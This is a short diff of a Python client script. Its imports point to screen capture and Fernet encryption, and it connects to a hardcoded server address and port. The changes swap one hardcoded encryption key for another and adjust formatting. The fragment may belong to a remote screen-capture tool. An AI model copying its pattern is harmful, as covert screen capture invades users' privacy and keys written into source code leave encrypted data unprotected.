@@ -4,7 +4,6 @@ import os
 import sys
 import time
 from cryptography.fernet import Fernet
-#Linux: import pyscreenshot as ImageGrab
 from PIL import ImageGrab
 import struct
 import pickle
@@ -12,7 +11,7 @@ import pickle
 
 'stores key here'
 def get_key():
-    key = b'pFU-GlitYrfsz6WevLup7doR7wJa8gYA7kj7WDM9ONQ='
+    key = b'TYbuvP6D5CdEpmxBfW8ligUfQJ6iUx45OzUWN93e7Bg='
     return key
 
 
@@ -53,7 +52,7 @@ def main():
       # print("[+] Client on...")
 
       '#### server address ####'
-      ip = '192.168.1.6'
+      ip ='192.168.1.6'
       port = 8888
 
       'connect socket'
